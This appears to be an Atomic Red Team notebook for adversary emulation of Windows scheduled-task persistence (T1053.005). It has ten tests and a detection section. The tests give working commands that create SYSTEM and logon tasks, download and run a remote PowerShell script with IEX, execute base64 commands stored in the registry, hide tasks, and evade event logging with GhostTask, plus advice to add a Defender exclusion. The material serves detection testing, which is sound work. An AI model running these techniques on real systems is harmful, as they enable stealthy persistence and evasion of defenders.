{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "fed4aa09",
   "metadata": {},
   "source": "# T1053.005 - Scheduled Task\nAdversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) "
  },
  {
   "cell_type": "markdown",
   "id": "9e563f16",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "5067a9ce",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Scheduled Task Startup Script",
    "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nschtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1054ba3c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "4e33589c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nschtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0569b734",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "09c05c88",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Scheduled task Local",
    "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nSCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12efc588",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "dfdf33bb",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nSCHTASKS /Delete /TN spawn /F >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2c2592a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "46267a31",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Scheduled task Remote",
    "Create a task on a remote system.\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nSCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "415e64aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "d0c09910",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nSCHTASKS /Delete /S localhost /U DOMAIN\\user /P At0micStrong /TN \"Atomic task\" /F >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8ba9114d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "82342343",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Powershell Cmdlet Scheduled Task",
    "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "953c60c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "5a157214",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e4112596",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c6449f1c",
   "metadata": {},
   "source": "### Atomic Test #5 - Task Scheduler via VBA\nThis module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Microsoft #{ms_product} must be installed\n\n##### Check Prereq Commands:\n```powershell\ntry {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  $process = \"Word\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nWrite-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c8be0b55",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b2222ce1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Scheduler\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "543f575e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "7c32df6c",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"Run Notepad\" -Confirm:$false\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9c855ce3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "7b07de4a",
   "metadata": {},
   "source": "### Atomic Test #6 - WMI Invoke-CimMethod Scheduled Task\nCreate an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: File to copy must exist on disk at specified location (#{xml_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_005_WMI.xml\" -OutFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f8162ef7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ef5b8cbb",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "41a3e5c3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "25a9b32d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3ee3ddad",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "25cacb95",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Scheduled Task Executing Base64 Encoded Commands From Registry",
    "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f\nschtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7ad7b3d6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "e50f1143",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nschtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1\nreg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96308d7e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "8b5ddb44",
   "metadata": {},
   "source": "### Atomic Test #8 - Import XML Schedule Task with Hidden Attribute\nCreate an scheduled task that executes calc.exe after user login from XML that contains hidden setting attribute. \nThis technique was seen several times in tricbot malware and also with the targetted attack campaigne the industroyer2.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: File to copy must exist on disk at specified location (#{xml_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1053.005/src/T1053_05_SCTASK_HIDDEN_ATTRIB.xml\" -OutFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "903caaa4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "faca0ba4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\")\nInvoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f3db2fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "310bfb19",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"atomic red team\" -confirm:$false >$null 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b8065528",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c61e1702",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - PowerShell Modify A Scheduled Task",
    "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTaskModifed -InputObject $object\n$NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"\nSet-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "41d82c84",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "dd56ffc3",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nUnregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e18a3bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a81b08a4",
   "metadata": {},
   "source": "### Atomic Test #10 - Scheduled Task (\"Ghost Task\") via Registry Key Manipulation\nCreate a scheduled task through manipulation of registry keys. This procedure is implemented using the [GhostTask](https://github.com/netero1010/GhostTask) utility. By manipulating registry keys under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree, the tool creates user-specified scheduled tasks without a corresponding Windows Event 4698, which is logged when scheduled tasks are created through conventional means.\nThis requires a download of the GhostTask binary, which must be run as NT Authority\\SYSTEM. Upon successful execution of this test, a scheduled task will be set to run at logon which launches notepad.exe or runs a user-specified command.\nFor further exploration of this procedure and guidance for hunting and detection, see [Hunting G-G-G-GhostTasks!](https://medium.com/p/154b50ab6a78).\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PsExec tool from Sysinternals must exist in the ExternalPayloads directory\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\") { exit 0} else { exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\" -Force\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" -Force\n\n```\n##### Description: GhostTask.exe tool from netero101 must exist in the ExternalPayloads directory. This tool may be quarantined by windows defender; disable windows defender real-time protection to fix it or add the ExternalPayloads directory as an exclusion, using a command like `Add-MpPreference -ExclusionPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\"`\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\") { exit 0} else { exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/netero1010/GhostTask/releases/download/1.0/GhostTask.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "54ca37c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "aa1005df",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\localhost add lilghostie \"cmd.exe\" \"/c notepad.exe\" $env:USERDOMAIN + '\\' + $env:USERNAME logon\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "51d2abda",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "92b09b8e",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -accepteula -s \"cmd.exe\"\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\GhostTask.exe\" \\\\localhost delete lilghostie > nul```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e0eb3be1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1053.005 -TestNumbers 10 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6ced5fad",
   "metadata": {},
   "source": "## Detection\nMonitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}